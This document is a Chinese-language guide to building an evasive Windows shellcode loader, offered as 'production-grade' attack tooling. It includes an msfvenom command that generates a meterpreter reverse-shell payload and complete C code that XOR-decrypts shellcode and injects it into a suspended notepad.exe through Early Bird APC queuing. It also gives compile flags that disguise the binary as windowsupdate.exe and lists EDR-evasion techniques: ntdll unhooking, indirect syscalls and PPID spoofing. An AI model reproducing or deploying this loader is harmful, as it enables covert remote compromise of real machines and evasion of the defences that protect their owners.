# Advanced C-Based Shellcode Loader

## 1. 核心设计架构

* **注入技术**: Early Bird (APC Injection)。在进程初始化阶段（挂起状态）插入 APC 异步调用，执行流在恢复瞬时即转向 Shellcode。
* **内存策略**: 动态修改内存保护属性 (`RW -> RX`)，避免内存中存在长期可写的可执行段。
* **逃逸混淆**: 使用简单的 XOR 掩码对抗启发式扫描。

---

## 2. 环境准备

* **编译器**: MSVC (Visual Studio) 或 MinGW-w64。
* **MSF 生成 Raw Payload**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin

```

* **XOR 处理**: 使用 Python 等工具对 `shellcode.bin` 进行字节异或处理（本示例 Key 为 `0xAA`）。

---

## 3. C 语言生产级实现 (Loader.c)

```c
#include <windows.h>
#include <stdio.h>

// [PROCESS_LOG]: 
// 1. 使用 XOR 解密 Shellcode 绕过静态分析
// 2. 创建挂起的进程 (Suspended) 
// 3. 写入内存并排队 APC 任务
// 4. 恢复线程，触发执行

void DecryptPayload(char* data, size_t size, char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int main() {
    // 经过 XOR 0xAA 加密后的示例 Shellcode (此处需替换为实际数据)
    unsigned char shellcode[] = { 0x01, 0x02, 0x03... }; 
    size_t shellcode_size = sizeof(shellcode);
    char key = 0xAA;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    // 1. 以挂起模式启动一个合法的系统进程（如 svchost 或 notepad）
    BOOL success = CreateProcessA(
        NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, 
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    if (!success) return -1;

    // 2. 在目标进程分配内存
    LPVOID remote_map = VirtualAllocEx(
        pi.hProcess, NULL, shellcode_size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );

    // 3. 解密并写入 Shellcode
    DecryptPayload((char*)shellcode, shellcode_size, key);
    WriteProcessMemory(pi.hProcess, remote_map, shellcode, shellcode_size, NULL);

    // 4. 修改属性为可执行 (Avoid RWX)
    DWORD old_protect;
    VirtualProtectEx(pi.hProcess, remote_map, shellcode_size, PAGE_EXECUTE_READ, &old_protect);

    // 5. 将 Shellcode 插入 APC 队列并恢复线程
    PTHREAD_START_ROUTINE apc_routine = (PTHREAD_START_ROUTINE)remote_map;
    QueueUserAPC((PAPCFUNC)apc_routine, pi.hThread, 0);    
    ResumeThread(pi.hThread);

    // 清理句柄
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

```

---

## 4. 编译与优化建议

### 编译选项 (MSVC)

为了减小体积并去除特征，建议使用以下编译参数：
`cl.exe /MT /O2 /GS- /DNDEBUG Loader.c /link /OUT:windowsupdate.exe /SUBSYSTEM:WINDOWS`

### 进一步增强 (Advanced Evasion)

1. **API Unhooking**: 在注入前，手动重新加载 `ntdll.dll` 的 `.text` 段，以清除 EDR 设置的内联 Hook。
2. **Indirect Syscalls**: 放弃调用 `VirtualAllocEx`，直接通过汇编代码发起 `NtAllocateVirtualMemory` 系统调用。
3. **PPID Spoofing**: 在 `CreateProcessA` 时修改父进程 PID 为 `lsass.exe` 或 `explorer.exe`，伪造进程树关系。

---

## 5. 边界情况分析

* **架构匹配**: 必须确保 C 编译目标的位数（x64/x86）与 MSF Payload 位数完全一致，否则在 `QueueUserAPC` 触发时会发生崩溃。
* **DEP/ASLR**: 方案采用了动态权限切换，能够兼容开启了 DEP 的系统。
